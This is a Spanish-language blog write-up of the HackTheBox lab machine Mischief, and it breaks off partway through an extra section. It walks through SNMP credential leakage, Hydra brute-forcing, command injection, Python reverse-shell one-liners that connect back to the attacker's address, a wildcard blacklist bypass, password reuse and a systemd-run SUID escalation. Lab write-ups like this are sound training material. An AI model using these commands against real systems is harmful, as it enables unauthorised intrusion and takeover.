@@ -1,0 +1,528 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup HackTheBox Mischief</title>
+
+  <meta name="description" content="Resolución de la máquina Mischief de la plataforma de HackTheBox">
+  <meta name="author" content="GatoGamer1155">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup HackTheBox Mischief">
+  <meta name="twitter:description" content="Resolución de la máquina Mischief de la plataforma de HackTheBox">
+  <meta name="twitter:creator" content="GatoGamer1155">  
+  <meta name="twitter:image" content="/images/htb/mischief.png" />
+
+  <meta property="og:site_name" content="GatoGamer1155" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup HackTheBox Mischief">
+  <meta property="og:description" content="Resolución de la máquina Mischief de la plataforma de HackTheBox">
+  <meta property="og:image" content="/images/htb/mischief.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/images/htb/mischief.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="alternate" type="application/rss+xml" title="Writeup HackTheBox Mischief" href="/feed.xml">
+</head>
+
+  <body style="background-color: #282828;">
+  
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="GatoGamer1155">
+          <h1 class="panel-cover__title panel-title scale-up-center">GatoGamer1155</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top">Entusiasta del Hacking y CTFs</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/htb" title="GatoGamer1155" class="blog-button">HackTheBox</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+              
+              <li class="navigation__item grow">
+                <a href="https://github.com/gatogamer1155" title="Github" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://twitter.com/gatogamer1155" title="Twitter" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://instagram.com/gatogamer1155" title="Instagram" target="_blank">
+                  <i class="icon icon-social-instagram"></i>
+                  <span class="label">Instagram</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://youtube.com/@gatogamer1155" title="Youtube" target="_blank">
+                  <i class="icon icon-social-youtube"></i>
+                  <span class="label">Youtube</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="mailto:gatogamer1155@gmail.com" title="Correo Electronico" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>
+
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+      <h3 class="post-title">Contenido</h3><br>
+      <ul>
+        <li><a href="#enumeration">Enumeración</a></li>
+        <li><a href="#shell-www-data">Shell - www-data</a></li>
+        <li><a href="#shell-loki">Shell - loki</a></li>
+        <li><a href="#shell-root">Shell - root</a></li>
+        <li><a href="#extra1-loki">Extra 1 - loki</a></li>
+        <li><a href="#extra2-root">Extra 2 - root</a></li>
+        <li><a href="#extra3-root">Extra 3 - root</a></li>
+      </ul>
+  </div>
+
+  <header class="post-header slide-top">
+    <h4 class="post-title">HackTheBox</h4>
+    <picture><img src="/images/htb/mischief.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
+    <h2 class="post-title">Mischief</h2><br>
+  </header>
+  
+<section class="post" id="enumeration">
+<br><h3 class="post-title">Enumeración</h3><br>
+
+<p class="plain-text">Iniciamos la máquina escaneando los puertos de la máquina con <code class="language-plaintext highlighter-rouge">nmap</code> donde encontramos varios puertos abiertos, entre ellos el <code class="language-plaintext highlighter-rouge">80</code> que corre un servicio <code class="language-plaintext highlighter-rouge">http</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ nmap </span><span class="p">10.10.10.92
+Nmap scan report for 10.10.10.92  
+PORT     STATE SERVICE
+22/tcp   open  ssh
+3366/tcp open  creativepartnr</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En el puerto <code class="language-plaintext highlighter-rouge">3366</code> podemos encontrar una página la cual nos pide <code class="language-plaintext highlighter-rouge">credenciales</code></p>
+<a href="/htb/mischief/1.png" target="_blank"><div><p><img src="/htb/mischief/1.png"></p></div></a>
+
+<p class="plain-text">Al hacer un curl al puerto <code class="language-plaintext highlighter-rouge">3366</code> en las cabeceras de respuesta nos dice que la web corre en un <code class="language-plaintext highlighter-rouge">SimpleHTTPServer</code> usando la version de <code class="language-plaintext highlighter-rouge">Python 2.7.15rc1</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ curl</span><span class="p"> -s 10.10.10.92:3366 -I
+HTTP/1.0 200 OK
+Server: SimpleHTTP/0.6 Python/2.7.15rc1  
+Content-type: text/html</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Como de poco nos sirve pasamos al protocolo <code class="language-plaintext highlighter-rouge">UDP</code>, donde al escanear puertos con <code class="language-plaintext highlighter-rouge">nmap</code> hay uno bastante interesante y es el servicio <code class="language-plaintext highlighter-rouge">snmp</code> corriendo en el 161</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo nmap</span><span class="p"> -sU -T5 -Pn -n --top-ports 100 10.10.10.92  
+Nmap scan report for 10.10.10.92
+PORT    STATE SERVICE
+161/udp open  snmp</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Usando apt instalamos algunos <code class="language-plaintext highlighter-rouge">mibs</code> para snmp, y para poder usarlos en el archivo de configuracion <code class="language-plaintext highlighter-rouge">/etc/snmp/snmp.conf</code> comentamos la unica linea descomentada</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo apt </span><span class="p">install snmp-mibs-downloader  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con <code class="language-plaintext highlighter-rouge">snmpbulkwalk</code> usando como <code class="language-plaintext highlighter-rouge">public</code> como community string y el mib <code class="language-plaintext highlighter-rouge">hrSWRunName</code> enumeramos procesos, la web corre <code class="language-plaintext highlighter-rouge">python</code> asi que filtramos por el</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ snmpbulkwalk </span><span class="p">-v2c -c public 10.10.10.92 hrSWRunName | </span><span class="ve">grep </span><span class="p">python  
+HOST-RESOURCES-MIB::hrSWRunName.788 = STRING: "python"</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Encontramos un proceso que corre <code class="language-plaintext highlighter-rouge">python</code> correspondiente al pid <code class="language-plaintext highlighter-rouge">788</code>, listando un poco mas de informacion de este pid logramos ver partes del <code class="language-plaintext highlighter-rouge">comando</code> y en los argumentos de este se muestran las <code class="language-plaintext highlighter-rouge">credenciales</code> con las que corre el servidor web</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ snmpbulkwalk</span><span class="p"> -v2c -c public 10.10.10.92 hrSWRunTable | </span><span class="ve">grep </span><span class="p">788
+HOST-RESOURCES-MIB::hrSWRunIndex.788 = INTEGER: 788
+HOST-RESOURCES-MIB::hrSWRunName.788 = STRING: "python"
+HOST-RESOURCES-MIB::hrSWRunID.788 = OID: SNMPv2-SMI::zeroDotZero
+HOST-RESOURCES-MIB::hrSWRunPath.788 = STRING: "python"
+HOST-RESOURCES-MIB::hrSWRunParameters.788 = STRING: "-m SimpleHTTPAuthServer 3366 loki:godofmischiefisloki --dir /home/loki/hosted/"  
+HOST-RESOURCES-MIB::hrSWRunType.788 = INTEGER: application(4)
+HOST-RESOURCES-MIB::hrSWRunStatus.788 = INTEGER: runnable(2)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al usar las credenciales para entrar a la web en el puerto <code class="language-plaintext highlighter-rouge">3366</code> accedemos y nos encontramos con 2 posibles contraseñas para <code class="language-plaintext highlighter-rouge">loki</code> pero de poco nos sirven</p>
+<a href="/htb/mischief/2.png" target="_blank"><div><p><img src="/htb/mischief/2.png"></p></div></a>
+
+<p class="plain-text">Volvemos a snmp donde al usar el mib <code class="language-plaintext highlighter-rouge">ipAddressType</code> podemos ver las direcciones de todas las <code class="language-plaintext highlighter-rouge">interfaces</code> de red que tiene la maquina victima entre ellas la <code class="language-plaintext highlighter-rouge">IPv6</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ snmpbulkwalk </span><span class="p">-v2c -c public 10.10.10.92 ipAddressType
+IP-MIB::ipAddressType.ipv4."10.10.10.92" = INTEGER: unicast(1)
+IP-MIB::ipAddressType.ipv4."10.10.255.255" = INTEGER: broadcast(3)
+IP-MIB::ipAddressType.ipv4."127.0.0.1" = INTEGER: unicast(1)
+IP-MIB::ipAddressType.ipv6."00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:01" = INTEGER: unicast(1)  
+IP-MIB::ipAddressType.ipv6."de:ad:be:ef:00:00:00:00:02:50:56:ff:fe:96:ee:9e" = INTEGER: unicast(1)  
+IP-MIB::ipAddressType.ipv6."fe:80:00:00:00:00:00:00:02:50:56:ff:fe:96:ee:9e" = INTEGER: unicast(1)  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Quitando los <code class="language-plaintext highlighter-rouge">:</code> extras cada 2 caracteres podemos obtener la direccion <code class="language-plaintext highlighter-rouge">IPv6</code> real</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">dead:beef:0000:0000:0250:56ff:fe96:ee9e  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Haciendo de nuevo un escaneo de puertos TCP con <code class="language-plaintext highlighter-rouge">nmap</code> pero esta vez por <code class="language-plaintext highlighter-rouge">IPv6</code> tenemos acceso a un nuevo puerto y es el <code class="language-plaintext highlighter-rouge">80</code>, probablemente un servicio web</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ nmap </span><span class="p">-6 dead:beef:0000:0000:0250:56ff:fe96:ee9e  
+Nmap scan report for dead:beef::250:56ff:fe96:ee9e  
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Aunque podriamos usar <code class="language-plaintext highlighter-rouge">[dead:beef:****]</code> para abrir la página desde la dirección <code class="language-plaintext highlighter-rouge">IPv6</code> agregaremos la ip con el dominio <code class="language-plaintext highlighter-rouge">mischief.htb</code> para tener mayor comodidad</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ echo </span><span class="am">"dead:beef:0000:0000:0250:56ff:fe96:ee9e mischief.htb" </span><span class="p">| </span><span class="ve">sudo tee</span><span class="p"> -a /etc/hosts  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La web esta vez en el puerto <code class="language-plaintext highlighter-rouge">80</code> nos muestra un boton que redirige a un <code class="language-plaintext highlighter-rouge">login</code></p>
+<a href="/htb/mischief/3.png" target="_blank"><div><p><img src="/htb/mischief/3.png"></p></div></a>
+
+<p class="plain-text">Tenemos un login, si enviamos credenciales <code class="language-plaintext highlighter-rouge">incorrectas</code> a este panel nos devuelve el mensaje <code class="language-plaintext highlighter-rouge">Sorry</code> diciendo que son incorrectas, podemos usar esto como estado</p>
+<a href="/htb/mischief/5.png" target="_blank"><div><p><img src="/htb/mischief/5.png"></p></div></a>
+
+<p class="plain-text">Usando <code class="language-plaintext highlighter-rouge">hydra</code> y un diccionario de seclists podemos usar las 2 <code class="language-plaintext highlighter-rouge">contraseñas</code> que encontramos en el puerto <code class="language-plaintext highlighter-rouge">3366</code> indicando que el mensaje de error contiene <code class="language-plaintext highlighter-rouge">Sorry</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ hydra</span><span class="p"> -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P passwords.txt mischief.htb http-post-form </span><span class="am">"/login.php:user=^USER^&password=^PASS^:Sorry"</span><span class="p">  
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak
+[DATA] attacking http-post-form://mischief.htb:80/login.php:user=^USER^&password=^PASS^:Sorry
+[</span><span class="ve">80</span><span class="p">][</span><span class="ve">http-post-form</span><span class="p">] host: </span><span class="ve">mischief.htb</span><span class="p">   login: </span><span class="ve">administrator</span><span class="p">   password: </span><span class="ve">trickeryanddeceit</span><span class="p">
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished</span>
+</code></pre></div></div><br>
+
+</section>
+<section class="post" id="shell-www-data">
+<br><h3 class="post-title">Shell - www-data</h3><br>
+
+<p class="plain-text">A traves de fuerza bruta con <code class="language-plaintext highlighter-rouge">hydra</code> encontramos que una de las contraseñas es valida para <code class="language-plaintext highlighter-rouge">administrator</code> en el login, al ingresar podemos ver un panel de ejecucion de <code class="language-plaintext highlighter-rouge">comandos</code> donde solo nos dice si el comando se ha ejecutado o no</p>
+<a href="/htb/mischief/6.png" target="_blank"><div><p><img src="/htb/mischief/6.png"></p></div></a>
+
+<p class="plain-text">Al agregar un simple <code class="language-plaintext highlighter-rouge">;</code> en el cuadro y enviar la solicitud nos muestra el <code class="language-plaintext highlighter-rouge">output</code> del comando ejecutado, en este caso el output del comando de <code class="language-plaintext highlighter-rouge">ping</code> al localhost</p>
+<a href="/htb/mischief/7.png" target="_blank"><div><p><img src="/htb/mischief/7.png"></p></div></a>
+
+<p class="plain-text">Podemos cambiar el comando por un <code class="language-plaintext highlighter-rouge">id;</code> y podemos ver que el usuario <code class="language-plaintext highlighter-rouge">www-data</code> es quien ejecuta los comandos, sin embargo es bastante probable que haya alguna <code class="language-plaintext highlighter-rouge">blacklist</code> por detrás ya que no podemos ejecutar algunos comandos como <code class="language-plaintext highlighter-rouge">nc</code></p>
+<a href="/htb/mischief/8.png" target="_blank"><div><p><img src="/htb/mischief/8.png"></p></div></a>
+
+<p class="plain-text">El comando <code class="language-plaintext highlighter-rouge">python</code> no esta dentro de la blacklist pero al enviar un tipico comando para enviar una <code class="language-plaintext highlighter-rouge">reverse shell</code> hacia nuestro host no recibimos la conexion</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.10",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'  </span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo netcat</span><span class="p"> -lvnp 443
+Listening on 0.0.0.0 443  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Sabemos que la maquina involucra <code class="language-plaintext highlighter-rouge">IPv6</code> asi que es posible que este limitado a nivel de conexiones por <code class="language-plaintext highlighter-rouge">IPv4</code>, la dirección IPv6 podemos verla con <code class="language-plaintext highlighter-rouge">ifconfig</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ifconfig </span><span class="p">tun0 
+tun0: flags=4305&ltUP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
+        inet 10.10.14.10  netmask 255.255.254.0  destination 10.10.14.10
+        inet6 dead:beef:2::1008  prefixlen 64  scopeid 0x0&ltglobal>
+        inet6 fe80::dcd6:9baf:f0f5:c965  prefixlen 64  scopeid 0x20&ltlink>
+        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)  
+        RX packets 0  bytes 0 (0.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 31  bytes 4040 (3.9 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En el oneliner de python cambiamos la dirección <code class="language-plaintext highlighter-rouge">IPv4</code> por la <code class="language-plaintext highlighter-rouge">IPv6</code> ademas de cambiar <code class="language-plaintext highlighter-rouge">AF_INET</code> por <code class="language-plaintext highlighter-rouge">AF_INET6</code> para decirle que es ese tipo de conexion</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::1008",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al hacerlo recibimos la shell en el listener de <code class="language-plaintext highlighter-rouge">netcat</code> en el que tambien agregamos el parametro <code class="language-plaintext highlighter-rouge">-6</code>, ahora tenemos una shell como el usuario <code class="language-plaintext highlighter-rouge">www-data</code> en la maquina</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo netcat </span><span class="p">-6lvnp 443
+Listening on :: 443
+Connection received on dead:beef::250:56ff:fe96:ee9e
+$ script /dev/null -c bash
+Script started, file is /dev/null
+</span><span class="ve">www-data@Mischief</span><span class="p">:</span><span class="az">~/html</span><span class="p">$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)  
+</span><span class="ve">www-data@Mischief</span><span class="p">:</span><span class="az">~/html</span><span class="p">$ hostname -I
+10.10.10.92 dead:beef::250:56ff:fe96:ee9e 
+</span><span class="ve">www-data@Mischief</span><span class="p">:</span><span class="az">~/html</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+</section>
+<section class="post" id="shell-loki">
+<br><h3 class="post-title">Shell - loki</h3><br>
+
+<p class="plain-text">En el directorio <code class="language-plaintext highlighter-rouge">home</code> del usuario loki podemos encontrar un archivo llamado <code class="language-plaintext highlighter-rouge">credentials</code> el cual contiene una sola linea que parecer ser su <code class="language-plaintext highlighter-rouge">contraseña</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">www-data@Mischief</span><span class="p">:</span><span class="az">/home/loki</span><span class="p">$ ls -l
+-rw-rw-r-- 1 loki loki   28 May 17  2018 credentials  
+drwxrwxr-x 2 loki loki 4096 Jul 20  2022 </span><span class="az">hosted</span><span class="p">
+-r-------- 1 loki loki   33 May 17  2018 user.txt
+</span><span class="ve">www-data@Mischief</span><span class="p">:</span><span class="az">/home/loki</span><span class="p">$ cat credentials 
+pass: lokiisthebestnorsegod
+</span><span class="ve">www-data@Mischief</span><span class="p">:</span><span class="az">/home/loki</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos simplemente usar la contraseña para conectarnos por <code class="language-plaintext highlighter-rouge">ssh</code> como el usuario <code class="language-plaintext highlighter-rouge">loki</code>, obtenemos una shell como este usuario y podemos leer la flag <code class="language-plaintext highlighter-rouge">user.txt</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ssh </span><span class="p">loki@10.10.10.92
+loki@10.10.10.92's password: lokiisthebestnorsegod  
+</span><span class="ve">loki@Mischief</span><span class="p">:</span><span class="az">~</span><span class="p">$ id
+uid=1000(loki) gid=1004(loki) groups=1004(loki)
+</span><span class="ve">loki@Mischief</span><span class="p">:</span><span class="az">~</span><span class="p">$ hostname -I
+10.10.10.92 dead:beef::250:56ff:fe96:ee9e 
+</span><span class="ve">loki@Mischief</span><span class="p">:</span><span class="az">~</span><span class="p">$ cat user.txt 
+bf5**************************060
+</span><span class="ve">loki@Mischief</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+</section>
+<section class="post" id="shell-root">
+<br><h3 class="post-title">Shell - root</h3><br>
+
+<p class="plain-text">Al listar el <code class="language-plaintext highlighter-rouge">historial</code> de comandos que ha ejecutado este usuario vemos un comando de <code class="language-plaintext highlighter-rouge">python</code> donde usa como credenciales a <code class="language-plaintext highlighter-rouge">loki</code> y otra contraseña</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">loki@Mischief</span><span class="p">:</span><span class="az">~</span><span class="p">$ history
+    1  python -m SimpleHTTPAuthServer loki:lokipasswordmischieftrickery  
+    2  exit
+    3  free -mt
+    4  ifconfig
+    5  cd /etc/
+    6  sudo su
+    7  su
+    8  exit
+    9  su root
+   10  ls -la
+   11  sudo -l
+   12  ifconfig
+   13  id
+   14  cat .bash_history 
+   15  nano .bash_history 
+   16  exit
+   19  id
+   20  hostname -I
+   21  cat user.txt 
+   24  history
+</span><span class="ve">loki@Mischief</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Puede que esa contraseña la reutilize el usuario <code class="language-plaintext highlighter-rouge">root</code>, sin embargo al intentar usar <code class="language-plaintext highlighter-rouge">su</code> o <code class="language-plaintext highlighter-rouge">sudo</code> para ejecutar comandos como root nos dice que no tenemos <code class="language-plaintext highlighter-rouge">permiso</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">loki@Mischief</span><span class="p">:</span><span class="az">~</span><span class="p">$ su root
+-bash: /bin/su: Permission denied
+</span><span class="ve">loki@Mischief</span><span class="p">:</span><span class="az">~</span><span class="p">$ sudo -u root bash
+-bash: /usr/bin/sudo: Permission denied  
+</span><span class="ve">loki@Mischief</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con <code class="language-plaintext highlighter-rouge">getfacl</code> podemos listar mejor los privilegios sobre estos binarios, al usuario <code class="language-plaintext highlighter-rouge">loki</code> solo se le otorgaron privilegios <code class="language-plaintext highlighter-rouge">r--</code> osea de lectura y no de <code class="language-plaintext highlighter-rouge">ejecucion</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">loki@Mischief</span><span class="p">:</span><span class="az">~</span><span class="p">$ getfacl /bin/su
+getfacl: Removing leading '/' from absolute path names  
+# file: bin/su
+# owner: root
+# group: root
+# flags: s--
+user::rwx
+user:loki:r--
+group::r-x
+mask::r-x
+other::r-x
+</span><span class="ve">loki@Mischief</span><span class="p">:</span><span class="az">~</span><span class="p">$ getfacl /usr/bin/sudo
+getfacl: Removing leading '/' from absolute path names  
+# file: usr/bin/sudo
+# owner: root
+# group: root
+# flags: s--
+user::rwx
+user:loki:r--
+group::r-x
+mask::r-x
+other::r-x
+</span><span class="ve">loki@Mischief</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Sin embargo esta regla no aplica para el usuario <code class="language-plaintext highlighter-rouge">www-data</code> donde al usar <code class="language-plaintext highlighter-rouge">su root</code> y proporcionar la contraseña obtenemos una shell como el usuario <code class="language-plaintext highlighter-rouge">root</code> sin ningun problema, sin embargo al intentar leer la <code class="language-plaintext highlighter-rouge">flag</code> nos dice que no se encuentra ahi</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">www-data@Mischief</span><span class="p">:</span><span class="az">~</span><span class="p">$ su root
+Password: lokipasswordmischieftrickery  
+</span><span class="ve">root@Mischief</span><span class="p">:</span><span class="az">~</span><span class="p"># id
+uid=0(root) gid=0(root) groups=0(root)
+</span><span class="ve">root@Mischief</span><span class="p">:</span><span class="az">~</span><span class="p"># hostname -I
+10.10.10.92 dead:beef::250:56ff:fe96:ee9e 
+</span><span class="ve">root@Mischief</span><span class="p">:</span><span class="az">~</span><span class="p"># cat /root/root.txt 
+The flag is not here, get a shell to find it!  
+</span><span class="ve">root@Mischief</span><span class="p">:</span><span class="az">~</span><span class="p">#</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Usando el comando <code class="language-plaintext highlighter-rouge">find</code> buscamos por el archivo con nombre <code class="language-plaintext highlighter-rouge">root.txt</code>, una vez encontramos la ruta basta con hacerle un tipico <code class="language-plaintext highlighter-rouge">cat</code> para leer la flag final</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">root@Mischief</span><span class="p">:</span><span class="az">~</span><span class="p"># find / -name root.txt 2>/dev/null
+/usr/lib/gcc/x86_64-linux-gnu/7/root.txt
+/root/root.txt
+</span><span class="ve">root@Mischief</span><span class="p">:</span><span class="az">~</span><span class="p"># cat /usr/lib/gcc/x86_64-linux-gnu/7/root.txt  
+ae1**************************807
+</span><span class="ve">root@Mischief</span><span class="p">:</span><span class="az">~</span><span class="p">#</span>
+</code></pre></div></div><br>
+
+</section>
+<section class="post" id="extra1-loki">
+<br><h3 class="post-title">Extra 1 - loki</h3><br>
+
+<p class="plain-text">En la web del puerto <code class="language-plaintext highlighter-rouge">80</code> nos dicen que existe un archivo llamado <code class="language-plaintext highlighter-rouge">credentials</code> en el directorio <code class="language-plaintext highlighter-rouge">home</code> de loki pero esta dentro de la <code class="language-plaintext highlighter-rouge">blacklist</code> asi que no podemos leerla</p>
+<a href="/htb/mischief/9.png" target="_blank"><div><p><img src="/htb/mischief/9.png"></p></div></a>
+
+<p class="plain-text">La string <code class="language-plaintext highlighter-rouge">credentials</code> esta en la blacklist sin embargo podemos usar algo como <code class="language-plaintext highlighter-rouge">c*</code> para indicar que el archivo inicia con la letra <code class="language-plaintext highlighter-rouge">c</code> y despues contiene cualquier cosa</p>
+<a href="/htb/mischief/10.png" target="_blank"><div><p><img src="/htb/mischief/10.png"></p></div></a>
+
+<p class="plain-text">De esa manera nos muestra la contraseña de <code class="language-plaintext highlighter-rouge">loki</code> y podemos conectarnos por <code class="language-plaintext highlighter-rouge">ssh</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ssh </span><span class="p">loki@10.10.10.92
+loki@10.10.10.92's password: lokiisthebestnorsegod  
+</span><span class="ve">loki@Mischief</span><span class="p">:</span><span class="az">~</span><span class="p">$ id
+uid=1000(loki) gid=1004(loki) groups=1004(loki)
+</span><span class="ve">loki@Mischief</span><span class="p">:</span><span class="az">~</span><span class="p">$ hostname -I
+10.10.10.92 dead:beef::250:56ff:fe96:ee9e
+</span><span class="ve">loki@Mischief</span><span class="p">:</span><span class="az">~</span><span class="p">$ cat user.txt
+bf5**************************060
+</span><span class="ve">loki@Mischief</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+</section>
+<section class="post" id="extra2-root">
+<br><h3 class="post-title">Extra 2 - root</h3><br>
+
+<p class="plain-text">Para convertir en usuario <code class="language-plaintext highlighter-rouge">root</code> no podiamos ejecutar <code class="language-plaintext highlighter-rouge">su</code> o <code class="language-plaintext highlighter-rouge">sudo</code> sin embargo con el comando <code class="language-plaintext highlighter-rouge">systemd-run</code> podemos ejecutar un comando como este usuario, en este caso ejecutaremos <code class="language-plaintext highlighter-rouge">chmod u+s /bin/bash</code> para asignar privilegios <code class="language-plaintext highlighter-rouge">suid</code> a la bash</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">loki@Mischief</span><span class="p">:</span><span class="az">~</span><span class="p">$ systemd-run chmod u+s /bin/bash
+</span><span class="ro">==== AUTHENTICATING FOR org.freedesktop.systemd1.manage-units ===</span><span class="p">
+Authentication is required to manage system services or other units.  
+Authenticating as: root
+Password: lokipasswordmischieftrickery
+</span><span class="ro">==== AUTHENTICATION COMPLETE ===</span><span class="p">
+Running as unit: run-u42.service
+</span><span class="ve">loki@Mischief</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
